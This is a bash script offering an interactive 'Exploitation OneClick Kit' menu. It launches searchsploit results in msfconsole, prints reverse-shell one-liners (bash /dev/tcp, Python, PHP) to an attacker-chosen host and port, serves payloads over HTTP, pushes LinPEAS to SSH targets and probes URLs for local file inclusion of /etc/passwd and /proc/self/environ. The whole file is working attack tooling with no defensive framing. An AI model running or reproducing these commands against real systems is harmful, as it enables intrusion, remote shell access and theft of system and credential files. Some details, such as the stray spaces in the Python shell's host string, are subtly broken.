#!/usr/bin/env bash
# kit-exploit.sh — Exploitation OneClick Kit
set -euo pipefail
WORKDIR="$HOME/oneclick_kits/exploit"
mkdir -p "$WORKDIR"

function search_and_prepare_msf() {
  read -rp "Searchsploit query: " q
  searchsploit "$q" | tee "$WORKDIR/searchsploit_$(date +%s).txt"
  echo "Введите путь к эксплоиту (или пусто чтобы выйти):"
  read -rp "Exploit path: " ep
  [[ -f "$ep" ]] || { echo "Файл не найден"; return; }
  cp "$ep" "$WORKDIR/selected_exploit"
  echo "Запускаю msfconsole..."
  msfconsole -qx "use $WORKDIR/selected_exploit; set RHOSTS 127.0.0.1; set LHOST YOUR_LHOST; exploit"
}

function shellgen() {
  read -rp "LHOST: " lhost
  read -rp "LPORT: " lport
  cat <<EOF
# Common reverse shells:
bash: bash -i >& /dev/tcp/$lhost/$lport 0>&1
python3: python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect((" $lhost ",$lport)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
php: php -r '\$sock=fsockopen("$lhost",$lport);exec("/bin/sh -i <&3 >&3 2>&3");'
perl, powershell, nc -e examples...
EOF
}

function payload_server() {
  read -rp "Directory to serve (default .): " d
  d=${d:-.}
  read -rp "Port (default 8000): " p
  p=${p:-8000}
  echo "Serving $d on port $p"
  pushd "$d" >/dev/null
  python3 -m http.server "$p"
  popd >/dev/null
}

function priv_esc_check() {
  read -rp "SSH target (user@host): " t
  scp /usr/bin/linpeas.sh "$t:/tmp/" 2>/dev/null || true
  ssh "$t" "chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh | tee /tmp/linpeas_out.txt"
  echo "LinPEAS run finished on target."
}

function auto_lfi_exploit() {
  read -rp "Base URL (http://host): " url
  echo "Checking common LFI payloads..."
  for p in "../../../../etc/passwd" "../../../../proc/self/environ" "/var/log/apache2/access.log"; do
    u="${url}?file=${p}"
    echo -n "Trying $p ... "
    if curl -fs "$u" -o /tmp/lfi_tmp; then
      if grep -q "root:" /tmp/lfi_tmp; then
        echo "POTENTIAL /etc/passwd!"
        cat /tmp/lfi_tmp | sed -n '1,30p'
        return
      else
        echo "no obvious /etc/passwd"
      fi
    else
      echo "no response"
    fi
  done
  echo "LFI quick scan finished."
}

function menu() {
  while true; do
    cat <<EOF
=== Exploitation Kit ===
1) Searchsploit → prepare → launch in msfconsole
2) Generate reverse shell snippets
3) Payload static file server (python -m http.server)
4) Privilege escalation quick-check (linpeas via SSH)
5) Quick LFI scanner (basic checks)
0) Exit
EOF
    read -rp "Choice: " c
    case $c in
      1) search_and_prepare_msf;;
      2) shellgen;;
      3) payload_server;;
      4) priv_esc_check;;
      5) auto_lfi_exploit;;
      0) exit 0;;
      *) echo "Bad";;
    esac
  done
}

menu
